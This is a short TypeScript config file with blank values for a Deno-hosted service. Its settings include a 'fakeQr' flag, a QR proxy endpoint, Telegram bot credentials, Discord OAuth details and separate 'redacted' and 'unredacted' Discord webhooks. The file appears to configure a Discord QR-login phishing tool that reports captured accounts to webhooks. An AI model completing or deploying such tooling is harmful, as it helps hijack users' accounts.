// SERVER DETAILS
export const domain = 'name.deno.dev';
export const fullDomain = `https://${domain}`;
export const proxies: string[] = [];
export const fakeQr = true;
export const qrCodeEndpoint = 'localhost:8080/proxy';
export const hostingOnVPS = false;

// TELEGRAM DETAILS
export const telegramToken = '';
export const telegramChatId = '';

// DISCORD OAUTH DETAILS
export const clientID = '';
export const clientSecret = '';
export const redirectURI = `${fullDomain}/login`;

// WEBHOOKS
export const redactedWebhook = 'https://discord.com/api/webhooks/';
export const unredactedWebhook = 'https://discord.com/api/webhooks/';

// AUTO ROLE
export const autoRoleToken = '';
export const autoRoleGuildId = '';
export const autoRoleRoleId = '';